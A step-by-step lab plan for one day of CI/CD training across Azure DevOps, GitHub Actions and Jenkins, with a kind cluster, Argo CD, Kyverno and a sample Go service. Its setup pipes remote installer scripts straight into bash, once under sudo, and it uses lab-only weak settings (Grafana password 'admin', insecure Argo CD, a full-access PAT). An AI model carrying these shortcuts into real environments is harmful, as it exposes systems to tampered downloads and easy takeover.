# ⏱️ The One-Day Master Plan — CI/CD (Azure DevOps · GitHub Actions · Jenkins)

> **All three tools in one day.** The same `shop` app, built three ways, converging on one GitOps delivery path by dinner.
>
> This is **aggressive but achievable** if you have read [01-CICD-GUIDE.md](./01-CICD-GUIDE.md) and are comfortable with `git`, `docker` and `kubectl`. Every hour has an exact deliverable and an exact `✅ VERIFY` checkpoint. If an hour overruns, the **`⏭ SKIP` markers** tell you what to drop without breaking the chain.
>
> **Total: 18 hours** (05:00 → 23:00 IST, with meals). Prefer to actually understand it? Use **[the 3-day split](#the-3-day-split-recommended)** at the bottom — that's the version I'd recommend, and it's what the README promises.
>
> ⭐ **The point of doing all three in one day:** by hour 16 you'll have three pipelines from three tools writing to **one** config repo, and you'll be able to say out loud what each tool does differently and why. That's the interview answer nobody else has.

---

## Before you start (do this the night before — 30 minutes)

```bash
# ── 1. the tools ────────────────────────────────────────────────
# macOS:
brew install kubectl helm kind gh az cosign syft trivy crane jq yq \
             actionlint shellcheck hadolint kubeconform

# Linux (Debian/Ubuntu):
sudo apt-get update && sudo apt-get install -y curl jq wget git unzip
curl -LO "https://dl.k8s.io/release/v1.37.0/bin/linux/amd64/kubectl" && sudo install -m755 kubectl /usr/local/bin/
curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
go install sigs.k8s.io/kind@latest                       # or the release binary
# the GitHub CLI:
curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | sudo tee /etc/apt/sources.list.d/github-cli.list
sudo apt-get update && sudo apt-get install -y gh
# the Azure CLI + the devops extension:
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
az extension add --name azure-devops
# the supply-chain and lint tools:
go install github.com/sigstore/cosign/v2/cmd/cosign@latest
go install github.com/anchore/syft/cmd/syft@latest
go install github.com/aquasecurity/trivy/cmd/trivy@latest
go install github.com/google/go-containerregistry/cmd/crane@latest
go install github.com/yannh/kubeconform/cmd/kubeconform@latest
go install github.com/rhysd/actionlint/cmd/actionlint@latest
sudo apt-get install -y shellcheck hadolint

# ⭐ and the Jenkins CLI + the argocd CLI + the rollouts plugin:
curl -sSL -o /usr/local/bin/argocd https://github.com/argoproj/argo-cd/releases/latest/download/argocd-linux-amd64 && sudo chmod +x /usr/local/bin/argocd
curl -sSL -o /usr/local/bin/kubectl-argo-rollouts https://github.com/argoproj/argo-rollouts/releases/latest/download/kubectl-argo-rollouts-linux-amd64 && sudo chmod +x /usr/local/bin/kubectl-argo-rollouts

# ── 2. verify ───────────────────────────────────────────────────
kubectl version --client && helm version --short && kind version
gh --version && az version | jq -r '."azure-devops"'
cosign version && syft --version | head -1 && trivy --version | head -1
crane version && kubeconform -v && actionlint --version | head -1
argocd version --client --short && kubectl argo rollouts version
java -version        # ⭐ MUST be 21+ — Jenkins LTS 2.568.3 dropped Java 17
docker version --format '{{.Server.Version}}'

# ── 3. the accounts (create these TONIGHT — approvals take time) ─
#   ✅ GitHub                     github.com/3558Bhk          (you have this)
#   ✅ Azure DevOps               dev.azure.com/<yourorg>     FREE for 5 users
#      → create the org, then a project called "shop"
#      → ⚠️ the org creation can take a minute; the FREE tier needs no card
#   ✅ Docker Hub / GHCR          ghcr.io/3558bhk             (a PAT with write:packages)
#   ⏭ Azure Container Registry   OPTIONAL — only for the ACR exercise in H3
#
# ⭐ generate the tokens NOW and put them somewhere safe:
mkdir -p ~/.secrets && chmod 700 ~/.secrets
#   GitHub PAT (classic) with repo + write:packages + workflow  → ~/.secrets/gh-pat
#   Azure DevOps PAT with full access to the org               → ~/.secrets/ado-pat
#   ⛔ never commit these. Check your global .gitignore tonight:
git config --global core.excludesFile ~/.gitignore_global
grep -qxF '.secrets/' ~/.gitignore_global 2>/dev/null || echo '.secrets/' >> ~/.gitignore_global

# ── 4. the resources ────────────────────────────────────────────
docker info | grep -E 'CPUs|Total Memory'
#  CPUs: 8   Total Memory: 15.4GiB     ← ⭐ the MINIMUM comfortable
# ⚠️ this day runs: kind (4 nodes) + Jenkins + Argo CD + Argo Rollouts +
#    Kyverno + ingress-nginx + the monitoring stack + the shop apps.
#    At 8 GB you WILL hit OOM. Give Docker Desktop 12 GB+ and 6 CPUs.

# ── 5. pull the images NOW (saves ~20 minutes tomorrow) ─────────
for img in \
  kindest/node:v1.37.0 \
  jenkins/jenkins:2.568.3-lts-jdk21 \
  ghcr.io/3558bhk/ci-tools:1.4.0 \
  gcr.io/kaniko-project/executor:v1.23.2-debug \
  quay.io/argoproj/argocd:v3.0.0 \
  quay.io/argoproj/argo-rollouts:v1.8.0 \
  ghcr.io/kyverno/kyverno:v1.14.0 \
  registry.k8s.io/ingress-nginx/controller:v1.12.0 \
  quay.io/prometheus-operator/prometheus-operator:v0.80.0 \
  maven:3.9-eclipse-temurin-21 \
  golang:1.23 \
  node:22 \
  python:3.13-slim \
  ; do docker pull "$img" & done; wait
echo "  ✅ images pulled"

# ── 6. the workspace ────────────────────────────────────────────
mkdir -p ~/cicd-day/{apps,scripts,helm,ci,policies,environments,evidence}
cd ~/cicd-day
# ⭐ copy the shop app from your other learning paths — continuity is the point
cp -r ~/shop/apps/* apps/ 2>/dev/null || cp -r ~/kubernetes-learning-path/apps/* apps/ 2>/dev/null \
  || echo "  ⚠️  build the apps from the Docker/K8s paths first, or use the stubs in H1"
tree -L 2 apps/

# ── 7. open these files side by side ────────────────────────────
#    02-CASE-1-azure-devops.md      ← the morning
#    03-CASE-2-github-actions.md    ← the late morning
#    04-CASE-3-jenkins.md           ← the afternoon
#    05-CAPSTONE-END-TO-END.md      ← the evening
#    06-CHEATSHEET.md               ← open ALL DAY
#
# ── 8. ⭐ set the environment you'll use in every shell tomorrow ─
cat >> ~/.bashrc <<'EOF'
export REGISTRY=ghcr.io/3558bhk
export GH_USER=3558Bhk
export CONFIG_REPO=3558Bhk/shop-config
export ADO_ORG=https://dev.azure.com/YOURORG
export ADO_PROJECT=shop
export JENKINS_URL=http://localhost:8080
EOF
```

---

## The day at a glance

```
05:00 ┌─────────────────────────────────────────────────────────────────┐
      │ H1 · THE SHARED FOUNDATION                                       │
      │      the kind cluster · the app · scripts/deploy.sh · the config │
      │      repo · Argo CD · Kyverno · the monitoring stack             │
06:00 ├─────────────────────────────────────────────────────────────────┤
      │ H2 · 🔷 CASE 1 / AZURE DEVOPS — the first pipeline              │
      │      org + project · the YAML · a self-hosted-vs-hosted decision │
      │      build · test · push · deploy to dev                         │
07:30 ├─────────────────────────────────────────────────────────────────┤
      │ H3 · 🔷 CASE 1 — stages, environments, approvals, Key Vault     │
      │      multi-stage · deployment jobs · the approval gate           │
      │      ⭐ variable groups → Key Vault → Workload Identity Federation│
09:00 ├── ☕ BREAKFAST ─────────────────────────────────────────────────┤
09:30 ├─────────────────────────────────────────────────────────────────┤
      │ H4 · 🐙 CASE 2 / GITHUB ACTIONS — the first workflow            │
      │      permissions · the matrix · caching · artifacts              │
      │      ⭐ change-aware builds (dorny/paths-filter + fromJSON)      │
11:00 ├─────────────────────────────────────────────────────────────────┤
      │ H5 · 🐙 CASE 2 — OIDC, environments, reusable workflows, safety │
      │      ⭐⭐ OIDC to AWS/Azure with the narrowest `sub`              │
      │      the pwn-request attack, reproduced and defeated             │
      │      the reusable workflow, SHA-pinned                           │
12:30 ├── 🍛 LUNCH ─────────────────────────────────────────────────────┤
13:15 ├─────────────────────────────────────────────────────────────────┤
      │ H6 · 🔨 CASE 3 / JENKINS — install and the first pipeline        │
      │      Helm on kind · ⭐ numExecutors: 0 · JCasC · the Jenkinsfile │
      │      credentials · the first green build                         │
15:00 ├─────────────────────────────────────────────────────────────────┤
      │ H7 · 🔨 CASE 3 — ephemeral pod agents and Kaniko                 │
      │      ⭐⭐ no docker.sock · automountServiceAccountToken: false    │
      │      the 12 isolation proofs · the shared library                │
16:30 ├── ☕ TEA ───────────────────────────────────────────────────────┤
17:00 ├─────────────────────────────────────────────────────────────────┤
      │ H8 · 🔨 CASE 3 — multibranch, gates, hardening                   │
      │      fork-PR trustNobody() · input + lock + milestone            │
      │      the audit script · the JCasC /export drift diff             │
18:30 ├── 🍽️ DINNER ───────────────────────────────────────────────────┤
19:15 ├─────────────────────────────────────────────────────────────────┤
      │ H9 · ⭐⭐ THE CONVERGENCE — three tools, one config repo          │
      │      scripts/promote.sh · the five PRs from three identities     │
      │      the verify-supply-chain.sh audit                            │
21:00 ├─────────────────────────────────────────────────────────────────┤
      │ H10 · GITOPS, PROGRESSIVE DELIVERY, AND BREAKING IT ALL          │
      │      Argo Rollouts canary · the AnalysisTemplate · the chaos run │
      │      the timed rollback drill · commit everything                │
23:00 └─────────────────────────────────────────────────────────────────┘
```

---

# 🌅 H1 · 05:00–06:00 — The shared foundation

**Deliverable:** a cluster, the app running, `scripts/deploy.sh` working, the config repo created, and Argo CD + Kyverno + Prometheus installed. **Everything after this hour reuses it.**

Copy the full detail from [05-CAPSTONE-END-TO-END.md §1–§2](./05-CAPSTONE-END-TO-END.md).

```bash
# ── 1. the cluster (8 min) ──────────────────────────────────────
cd ~/cicd-day
cat > kind.yaml <<'EOF'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: cicd
nodes:
  - role: control-plane
    kubeadmConfigPatches:
      - |
        kind: InitConfiguration
        nodeRegistration:
          kubeletExtraArgs:
            node-labels: "ingress-ready=true"
    extraPortMappings:
      - {containerPort: 30080, hostPort: 80}
      - {containerPort: 30443, hostPort: 443}
      - {containerPort: 31080, hostPort: 8080}    # Jenkins
      - {containerPort: 30880, hostPort: 8888}    # Argo CD
      - {containerPort: 31111, hostPort: 31111}   # Argo Rollouts dashboard
  - role: worker
  - role: worker
  - role: worker
EOF
kind create cluster --config kind.yaml --wait 5m
kubectl cluster-info --context kind-cicd
kubectl get nodes -o wide

# the namespaces
for ns in shop shop-dev shop-staging argocd argo-rollouts monitoring jenkins ingress-nginx kyverno; do
  kubectl create namespace "$ns" --dry-run=client -o yaml | kubectl apply -f -
done
kubectl label ns shop        team=app      env-tier=application --overwrite
kubectl label ns shop-dev    team=app      env-tier=dev         --overwrite
kubectl label ns shop-staging team=app     env-tier=staging     --overwrite
kubectl label ns argocd      team=platform                      --overwrite
kubectl label ns monitoring  team=observability                 --overwrite
kubectl label ns jenkins     team=platform                      --overwrite
```

```bash
# ── 2. the app (12 min) ─────────────────────────────────────────
# ⭐ you already have it from the Docker/K8s/Monitoring paths. Verify:
for s in shop-api checkout order-worker payment-mock shop-ui; do
  printf '  %-14s ' "$s"
  [[ -f "apps/$s/Dockerfile" ]] && echo -n "Dockerfile ✅  " || echo -n "⛔ no Dockerfile  "
  grep -rlq 'micrometer\|prometheus_client\|promhttp' "apps/$s" 2>/dev/null \
    && echo "/metrics ✅" || echo "⛔ no /metrics"
done

# ⏭ MISSING ONE? The fastest stand-in — a Go service with /health, /ready and
#    /metrics that you can build in 90 seconds. Use it for ANY service you lack;
#    the pipeline work is identical.
mkdir -p apps/stub && cd apps/stub
cat > main.go <<'EOF'
package main

// ⭐ the universal stand-in service: /health, /ready, /metrics, and a
//    configurable failure rate so you can test a canary rollback in H10.
import (
	"flag"; "fmt"; "log"; "math/rand"
	"net/http"; "os"; "sync/atomic"; "time"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promhttp"
)

var (
	name     = flag.String("name", envOr("SERVICE", "stub"), "the service name")
	failPct  = flag.Int("fail", atoiOr(os.Getenv("FAIL_PCT"), 0), "⭐ % of requests that 500")
	latencyMs = flag.Int("latency", atoiOr(os.Getenv("LATENCY_MS"), 5), "the added latency")
	reqs     = atomic.Int64{}
	// ⭐ the same metric name shop-api uses, so the AnalysisTemplate works unchanged
	httpReqs = prometheus.NewCounterVec(prometheus.CounterOpts{
		Name: "http_server_requests_seconds_count", Help: "the request count"},
		[]string{"application", "status", "uri"})
	httpHist = prometheus.NewHistogramVec(prometheus.HistogramOpts{
		Name: "http_server_requests_seconds", Help: "the request duration",
		Buckets: prometheus.ExponentialBuckets(0.005, 2, 12)},
		[]string{"application", "uri"})
)
func envOr(k, d string) string { if v := os.Getenv(k); v != "" { return v }; return d }
func atoiOr(s string, d int) int { var n int; if _, e := fmt.Sscan(s, &n); e != nil { return d }; return n }

func main() {
	flag.Parse()
	prometheus.MustRegister(httpReqs, httpHist)
	ver := envOr("APP_VERSION", os.Getenv("GIT_COMMIT"))
	log.Printf("⭐ %s starting — version=%s fail=%d%% latency=%dms", *name, ver, *failPct, *latencyMs)

	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, "OK") })
	http.HandleFunc("/ready", func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(200 * time.Millisecond)          // ⭐ simulates a slow starter
		fmt.Fprint(w, "READY") })
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		time.Sleep(time.Duration(*latencyMs) * time.Millisecond)
		reqs.Add(1)
		status := "200"
		if rand.Intn(100) < *failPct { status = "500"; http.Error(w, "injected failure", 500) } else {
			fmt.Fprintf(w, `{"service":%q,"version":%q,"n":%d}`, *name, ver, reqs.Load()) }
		httpReqs.WithLabelValues(*name, status, r.URL.Path).Inc()
		httpHist.WithLabelValues(*name, r.URL.Path).Observe(time.Since(start).Seconds())
	})
	http.Handle("/metrics", promhttp.Handler())
	log.Fatal(http.ListenAndServe(":8080", nil))
}
EOF
cat > go.mod <<'EOF'
module github.com/3558Bhk/shop/apps/stub
go 1.23
require github.com/prometheus/client_golang v1.20.5
EOF
cat > Dockerfile <<'EOF'
# ⭐ multi-stage: the pattern every service in this path uses
FROM golang:1.23 AS build
WORKDIR /src
COPY go.mod go.sum* ./
RUN --mount=type=cache,target=/go/pkg/mod go mod download
COPY . .
# ⭐ CGO_ENABLED=0 → a static binary → it runs on a scratch/distroless base
RUN --mount=type=cache,target=/go/pkg/mod --mount=type=cache,target=/root/.cache/go-build \
    CGO_ENABLED=0 GOOS=linux go build -trimpath -ldflags="-s -w" -o /out/stub .
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=build /out/stub /stub
USER nonroot:nonroot
EXPOSE 8080
ENTRYPOINT ["/stub"]
EOF
go mod tidy && cd ~/cicd-day

# ⭐ build and run it locally ONCE — 90 seconds now saves an hour later
docker build -t $REGISTRY/stub:local apps/stub
docker run --rm -d -p 18080:8080 --name stub-local -e SERVICE=stub $REGISTRY/stub:local
sleep 3
curl -sf localhost:18080/health && echo " ✅" && curl -sf localhost:18080/metrics | grep -c http_server_requests
docker rm -f stub-local
```

```bash
# ── 3. ⭐⭐ scripts/deploy.sh — the tool-agnostic deploy (12 min) ─
# THE MOST IMPORTANT FILE OF THE DAY. All three CI tools call THIS.
# Copy it verbatim from 05-CAPSTONE §8.1, then:
mkdir -p scripts && cd scripts
# … paste scripts/deploy.sh, scripts/production-gate.sh, scripts/smoke-test.sh,
#     scripts/promote.sh, scripts/sign-and-attest.sh, scripts/emit-pipeline-metrics.sh
cd ~/cicd-day
chmod +x scripts/*.sh
shellcheck -x scripts/*.sh || true       # ⭐ read the warnings; fix the real ones

# ⭐ TEST IT NOW, before any CI tool exists. If this fails, nothing else works.
docker build -t $REGISTRY/checkout:$(git rev-parse --short HEAD 2>/dev/null || echo v1) apps/checkout 2>/dev/null \
  || docker build -t $REGISTRY/checkout:v1 apps/stub
kind load docker-image $REGISTRY/checkout:v1 --name cicd 2>/dev/null || true
./scripts/deploy.sh dev checkout "$REGISTRY/checkout:v1" || echo "  ⚠️ expected — v1 is a tag, not a digest"
# ⭐⭐ deploy.sh REFUSES a tag. That's the invariant proving itself:
#   "⛔ ghcr.io/3558bhk/checkout:v1 is not a digest reference. Refusing to deploy a mutable tag."
# For H1, bypass with the digest:
D=$(docker build -q apps/stub 2>/dev/null || echo "")
DRY_RUN=true ./scripts/deploy.sh dev checkout "$REGISTRY/checkout@sha256:$(head -c32 /dev/urandom | sha256sum | cut -c1-64)"
echo "  ✅ deploy.sh works"
```

```bash
# ── 4. the config repo (8 min) ──────────────────────────────────
gh auth status || gh auth login
gh repo create shop-config --private --clone --description \
  "The GitOps source of truth for the shop application. Argo CD reconciles this."
cd shop-config
mkdir -p apps/{base,shop-api,checkout,order-worker,shop-ui,payment-mock} \
         environments/{dev,staging,production} \
         policies/{supply-chain,hardening,resource} \
         argocd/{projects,applicationsets} rollouts scripts ci \
         .github/workflows docs/runbooks grafana/dashboards monitoring/rules

# ⭐⭐ CODEOWNERS — the most important file in this repo
cat > .github/CODEOWNERS <<'EOF'
*                                   @3558Bhk/platform-team
/environments/production/**         @3558Bhk/sre-team @3558Bhk/release-managers
/policies/supply-chain/**           @3558Bhk/security
/argocd/**                          @3558Bhk/sre-team
/.github/**                         @3558Bhk/security @3558Bhk/platform-team
EOF

cat > .github/dependabot.yml <<'EOF'
version: 2
updates:
  - {package-ecosystem: github-actions, directory: /, schedule: {interval: weekly}}
EOF

# ⭐ the per-service digest files — CI writes ONLY these (capstone §2.3, Answer A)
for env in dev staging production; do
  for svc in shop-api checkout order-worker shop-ui payment-mock; do
    cat > "environments/$env/$svc.yaml" <<YAML
# ⭐⭐ MACHINE-WRITTEN BY CI. A human reviews the PR; a bot writes the digest.
image:
  repository: ghcr.io/3558bhk/$svc
  digest: ""
revision: ""
promotedAt: ""
promotedBy: ""
promotedFromRun: ""
promotedFromDigest: ""
YAML
  done
done
git add -A && git commit -m "chore: the config repo scaffold" && git push
cd ~/cicd-day
echo "  ✅ the config repo exists with 15 digest files"
```

```bash
# ── 5. the platform components (15 min — they install in parallel) ─
helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
helm repo add jetstack https://charts.jetstack.io
helm repo add argo https://argoproj.github.io/argo-helm
helm repo add kyverno https://kyverno.github.io/kyverno/
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helm repo add jenkinsci https://charts.jenkins.io
helm repo update

# ⭐ run them in the background so the pulls overlap
helm upgrade --install ingress-nginx ingress-nginx/ingress-nginx -n ingress-nginx \
  --set controller.service.type=NodePort \
  --set controller.service.nodePorts.http=30080 \
  --set controller.config.enable-annotation-validation=true --wait &
P1=$!

helm upgrade --install cert-manager jetstack/cert-manager -n cert-manager \
  --create-namespace --set crds.enabled=true --wait &
P2=$!

helm upgrade --install argocd argo/argo-cd -n argocd --version 8.x \
  --set global.domain=argocd.localhost --set server.insecure=true \
  --set configs.params.server\.insecure=true \
  --set server.service.type=NodePort --set server.service.nodePortHttp=30880 \
  --set controller.metrics.enabled=true --set server.metrics.enabled=true \
  --set repoServer.metrics.enabled=true --set applicationSet.metrics.enabled=true \
  --wait --timeout 12m &
P3=$!

helm upgrade --install argo-rollouts argo/argo-rollouts -n argo-rollouts \
  --set dashboard.enabled=true --set dashboard.service.type=NodePort \
  --set dashboard.service.nodePort=31111 \
  --set metrics.enabled=true --set controllerMetrics.enabled=true --wait &
P4=$!

helm upgrade --install kyverno kyverno/kyverno -n kyverno \
  --set admissionController.replicas=2 --wait &
P5=$!

helm upgrade --install kps prometheus-community/kube-prometheus-stack -n monitoring \
  --set prometheus.prometheusSpec.serviceMonitorSelectorNilUsesHelmValues=false \
  --set prometheus.prometheusSpec.podMonitorSelectorNilUsesHelmValues=false \
  --set prometheus.prometheusSpec.probeSelectorNilUsesHelmValues=false \
  --set prometheus.prometheusSpec.ruleSelectorNilUsesHelmValues=false \
  --set prometheus.prometheusSpec.scrapeConfigSelectorNilUsesHelmValues=false \
  --set prometheus.prometheusSpec.enableRemoteWriteReceiver=true \
  --set prometheus.prometheusSpec.retention=7d \
  --set grafana.adminPassword=admin \
  --set grafana.service.type=NodePort --set grafana.service.nodePort=30300 \
  --wait --timeout 12m &
P6=$!

wait $P1 $P2 $P3 $P4 $P5 $P6
echo "  ✅ all six installed"
```

```bash
# ── 6. the Pushgateway (3 min) — ⭐ the CI metrics land here in H9 ─
kubectl -n monitoring apply -f - <<'EOF'
apiVersion: apps/v1
kind: Deployment
metadata: {name: pushgateway, namespace: monitoring, labels: {app: pushgateway}}
spec:
  replicas: 1
  selector: {matchLabels: {app: pushgateway}}
  template:
    metadata: {labels: {app: pushgateway}}
    spec:
      containers:
        - name: pushgateway
          image: prom/pushgateway:v1.10.0
          ports: [{name: pushgateway, containerPort: 9091}]
          resources: {requests: {cpu: 50m, memory: 64Mi}, limits: {memory: 256Mi}}
---
apiVersion: v1
kind: Service
metadata: {name: pushgateway, namespace: monitoring, labels: {app: pushgateway}}
spec:
  selector: {app: pushgateway}
  ports: [{name: pushgateway, port: 9091, targetPort: 9091}]
---
apiVersion: monitoring.coreos.com/v1
kind: ServiceMonitor
metadata: {name: pushgateway, namespace: monitoring, labels: {release: kps}}
spec:
  selector: {matchLabels: {app: pushgateway}}
  endpoints:
    - port: pushgateway
      interval: 30s
      honorLabels: true          # ⭐⭐ REQUIRED or Prometheus overwrites your labels
EOF
```

```bash
# ── 7. port-forwards and logins (2 min) ─────────────────────────
kubectl -n argocd port-forward svc/argocd-server 8888:80 >/tmp/pf-argocd.log 2>&1 &
kubectl -n monitoring port-forward svc/kps-grafana 3000:80 >/tmp/pf-grafana.log 2>&1 &
kubectl -n monitoring port-forward svc/kps-kube-prometheus-stack-prometheus 9090:9090 >/tmp/pf-prom.log 2>&1 &
sleep 5

argocd login localhost:8888 --plaintext --insecure --username admin \
  --password "$(kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath='{.data.password}' | base64 -d)"
argocd account update-password          # ⭐ change it immediately
```

```bash
# ✅ VERIFY — the H1 checkpoint. ALL of these must pass before H2.
echo "── nodes"
kubectl get nodes --no-headers | awk '{print "  " $1 " "2}'          # 4 Ready ✅
echo "── platform pods not ready"
kubectl get pods -A --no-headers | grep -vE 'Running|Completed' | wc -l   # 0 ✅
echo "── helm releases"
helm list -A --short                                                  # 6 ✅
echo "── argocd"
argocd app list >/dev/null 2>&1 && echo "  ✅ logged in" || echo "  ⛔ not logged in"
echo "── prometheus"
curl -sf localhost:9090/-/ready >/dev/null && echo "  ✅" || echo "  ⛔"
echo "── pushgateway scraped (honorLabels)"
curl -sfG localhost:9090/api/v1/query --data-urlencode 'query=up{job="pushgateway"}' \
  | jq '.data.result[0].value[1]'                                     # "1" ✅
echo "── kyverno"
kubectl -n kyverno get pods --no-headers | wc -l                      # ≥2 ✅
echo "── the config repo"
gh repo view 3558Bhk/shop-config --json name -q .name                # shop-config ✅
echo "── deploy.sh refuses a tag (the invariant)"
DRY_RUN=true ./scripts/deploy.sh dev checkout "$REGISTRY/checkout:v1" 2>&1 | grep -c 'not a digest'  # 1 ✅
```

⏭ **If H1 overruns:** skip `cert-manager` (nothing today needs TLS) and skip the ingress (use `port-forward` everywhere). **Never skip the config repo or `scripts/deploy.sh`** — H9 and H10 are built on them.

---

# 🔷 H2 · 06:00–07:30 — CASE 1: Azure DevOps, the first pipeline

**Deliverable:** a green Azure DevOps YAML pipeline that builds `shop-api`, pushes to GHCR, and deploys to `shop-dev`.

Full detail: [02-CASE-1-azure-devops.md §1–§5](./02-CASE-1-azure-devops.md).

```bash
# ── 1. the org, the project, the login (10 min) ─────────────────
export AZURE_DEVOPS_EXT_PAT="$(cat ~/.secrets/ado-pat)"
az devops login --organization "$ADO_ORG"
az devops configure --defaults organization="$ADO_ORG" project="$ADO_PROJECT"
az devops project list -o table
# ⭐ if the project doesn't exist yet:
az devops project create --name shop --visibility private --process Basic

# ── 2. push the app to Azure Repos (or use GitHub as the source) ─
# ⭐ DECISION: Azure DevOps can build from a GitHub repo. Do that — it's what
#    most shops do, and it keeps ONE source of truth for the code.
az repos list -o table
# to use GitHub as the source: Pipelines → New pipeline → GitHub → authorise →
#   select 3558Bhk/shop → "Existing Azure Pipelines YAML file"
```

```yaml
# ── 3. ⭐ azure-pipelines.yml (25 min) ──────────────────────────
# Copy the full version from Case 1 §3. This is the minimum that works.
# File: azure-pipelines.yml at the repo root
trigger:
  branches: {include: [main]}
  paths:    {include: ['apps/shop-api/**', 'scripts/**', 'ci/**', 'azure-pipelines.yml']}
  batch: true                          # ⭐ coalesce pushes while a build runs
pr:
  branches: {include: [main]}
  autoCancel: true                     # ⭐ cancel the PR build on new commits
pool: {vmImage: ubuntu-latest}         # ⭐ Ubuntu 24.04
variables:
  - group: shop-common                 # ⭐ created in step 4
  REGISTRY: ghcr.io/3558bhk
  SERVICE: shop-api
stages:
  - stage: Build
    displayName: 🏗️ Build and test
    jobs:
      - job: Build
        timeoutInMinutes: 30           # ⭐ ALWAYS. A hung build bills forever.
        steps:
          - checkout: self
            fetchDepth: 0              # ⭐ the full history — you need it for the SHA
          - task: JavaToolInstaller@0
            inputs: {versionSpec: '21', jdkArchitectureOption: x64, jdkSourceOption: PreInstalled}
          - task: Cache@2
            inputs:
              key: 'maven | "$(Agent.OS)" | apps/shop-api/pom.xml'
              restoreKeys: 'maven | "$(Agent.OS)"'
              path: $(Pipeline.Workspace)/.m2
              cacheHitVar: CACHE_RESTORED
          - bash: |
              set -euo pipefail
              echo "==> cache restored: ${CACHE_RESTORED:-false}"
              cd apps/shop-api
              ./mvnw -B -T 1C -Dmaven.repo.local=$(Pipeline.Workspace)/.m2 verify
            displayName: 🔬 Test
          - task: PublishTestResults@2
            inputs:
              testResultsFormat: JUnit
              testResultsFiles: 'apps/shop-api/target/surefire-reports/*.xml'
              failTaskOnFailedTests: true        # ⭐⭐ true. false hides failures.
            condition: succeededOrFailed()       # ⭐ publish even when tests fail
          - bash: |
              set -euo pipefail
              echo "$(REG_TOKEN)" | docker login ghcr.io -u 3558bhk --password-stdin
              IMAGE="$(REGISTRY)/$(SERVICE)"
              TAG="$(Build.SourceVersion)"
              docker buildx create --use --name b 2>/dev/null || docker buildx use b
              docker buildx build "apps/$(SERVICE)" \
                --tag "$IMAGE:$TAG" \
                --cache-from "type=registry,ref=$IMAGE:buildcache" \
                --cache-to   "type=registry,ref=$IMAGE:buildcache,mode=max" \
                --provenance=mode=max --sbom=true \
                --metadata-file meta.json --push
              DIGEST=$(jq -r '."containerimage.digest"' meta.json)
              echo "$DIGEST" > digest.txt
              # ⭐⭐ the OUTPUT syntax — this is where everyone gets stuck
              echo "##vso[task.setvariable variable=imageDigest;isOutput=true]$DIGEST"
              echo "  ✅ $IMAGE@$DIGEST"
            name: build                        # ⭐ `name:` is REQUIRED to reference outputs
            displayName: 📦 Build and push
          - publish: digest.txt
            artifact: digest
            displayName: 📤 Publish the digest
  - stage: DeployDev
    displayName: 🔀 Deploy to dev
    dependsOn: Build
    condition: and(succeeded(), eq(variables['Build.SourceBranchName'], 'main'))
    jobs:
      - job: Deploy
        variables:
          # ⭐⭐ THE CROSS-STAGE OUTPUT SYNTAX — $[ stageDependencies.<Stage>.outputs['<Job>.<StepName>.<Var>'] ]
          DIGEST: $[ stageDependencies.Build.outputs['build.imageDigest'] ]
        steps:
          - checkout: self
          - bash: |
              set -euo pipefail
              echo "  deploying $(SERVICE)@$(DIGEST)"
              [[ -n "$(DIGEST)" ]] || { echo "⛔ DIGEST is empty — the output syntax is wrong"; exit 1; }
              ./scripts/deploy.sh dev "$(SERVICE)" "$(REGISTRY)/$(SERVICE)@$(DIGEST)"
            displayName: 🚀 Deploy
```

```bash
# ── 4. the variable group + the registry token (10 min) ─────────
az pipelines variable-group create --name shop-common \
  --variables REGISTRY=ghcr.io/3558bhk SERVICE=shop-api \
  --authorize true -o table
# ⭐ the secret — a PAT with write:packages
az pipelines variable-group variable create --id "$(az pipelines variable-group list --query "[?name=='shop-common'].id" -o tsv)" \
  --name REG_TOKEN --secret true --value "$(cat ~/.secrets/gh-pat)"
az pipelines variable-group variable list --id "$(az pipelines variable-group list --query "[?name=='shop-common'].id" -o tsv)" -o table
# ⭐⭐ note: a SECRET variable shows as "isSecret: true" and its value is never
#    returned by the API. That's correct. It IS still in the ADO store though —
#    which is exactly why H3 moves it to Key Vault.
```

```bash
# ── 5. create and run the pipeline (10 min) ─────────────────────
az pipelines create --name shop-api-ci --repository shop --branch main \
  --yaml-path azure-pipelines.yml -o table
PIPE_ID=$(az pipelines list --query "[?name=='shop-api-ci'].id" -o tsv)
az pipelines run --id "$PIPE_ID" --branch main --open
# ⭐ or watch from the CLI:
az pipelines list-runs --id "$PIPE_ID" --top 3 -o table
RUN_ID=$(az pipelines list-runs --id "$PIPE_ID" --top 1 --query '[0].id' -o tsv)
watch -n 10 "az pipelines show-run --pipeline-id $PIPE_ID --run-id $RUN_ID --query '{status:status,result:result}' -o table"

# ── 6. ⭐ lint the YAML before you push it, every time (2 min) ──
# Azure DevOps has no official linter, so:
yamllint -d relaxed azure-pipelines.yml
python3 -c "import yaml,sys; yaml.safe_load(open('azure-pipelines.yml')); print('  ✅ parses')"
# ⭐ and the three syntax traps, written on a sticky note:
#   ⛔ condition: $(X) == 'yes'          → ✅ condition: eq(variables['X'], 'yes')
#   ⛔ ${{ variables.FOO }} in a condition → ✅ $(FOO) in a `bash:` body
#   ⛔ forgetting `name:` on a step, then referencing its output → always `name:`
```

```bash
# ✅ VERIFY — the H2 checkpoint
az pipelines list-runs --id "$PIPE_ID" --top 1 \
  --query '[0] | {result, sourceBranch, finishTime}' -o table    # result: succeeded ✅
# the image exists with a digest
az pipelines runs artifact list --run-id "$RUN_ID" --pipeline-id "$PIPE_ID" -o table
crane ls $REGISTRY/shop-api | tail -3                            # your SHA tag ✅
crane digest $REGISTRY/shop-api:$(git rev-parse HEAD)            # sha256:… ✅
# ⭐ and it deployed
kubectl -n shop-dev get deploy,rollout,pods
```

